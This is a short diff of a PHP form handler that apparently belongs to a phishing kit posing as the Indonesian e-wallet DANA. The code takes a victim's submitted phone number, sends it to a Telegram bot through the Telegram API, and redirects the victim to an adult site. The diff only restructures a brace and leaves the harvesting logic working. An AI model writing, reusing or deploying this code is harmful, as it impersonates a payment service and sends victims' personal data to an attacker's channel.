@@ -8,7 +8,7 @@ include "./telegram.php";
 if (isset($_POST['formNohp'])) {
 
 $message = "├•★𝓓𝓪𝓷𝓪 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★". "\n├───────────────────". "\n<b>├•𖥔 ɴᴏᴍᴏʀ ʜᴘ : </b>".  $_POST['nomor'].  "\n╰───────────────────";
-}
+
 function sendMessage($telegram_id, $message, $id_bot)
 {
 $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
@@ -24,4 +24,5 @@ $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&
 }
 sendMessage($telegram_id, $message, $id_bot);
 header("Location: https://xxxmovies.life");
-?> 
+}
+    ?> 
